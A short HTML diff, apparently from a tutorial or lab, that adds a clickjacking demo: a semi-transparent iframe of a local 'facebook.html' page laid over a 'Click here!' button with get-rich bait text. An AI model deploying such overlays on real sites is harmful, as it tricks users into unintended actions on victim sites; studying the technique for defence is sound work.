@@ -2,11 +2,31 @@
 
 <head>
     <meta charset="utf-8">
+    <style>
+        iframe {
+            /* iframe from victim site */
+            width: 400px;
+            height: 100px;
+            position: absolute;
+            top: 0;
+            left: -200px;
+            opacity: 0.5;
+            /* in real opacity: 0 */
+            z-index: 1;
+        }
+    </style>
 </head>
 <html>
 
 <body>
+    <div>Click to get rich now:</div>
 
+    <!-- The URL from victim site -->
+    <iframe src="/clickjacking/facebook.html"></iframe>
+
+    <button>Click here!</button>
+
+    <div>...and you're cool (I am cool hacker actually)!</div>
 </body>
 
 </html>
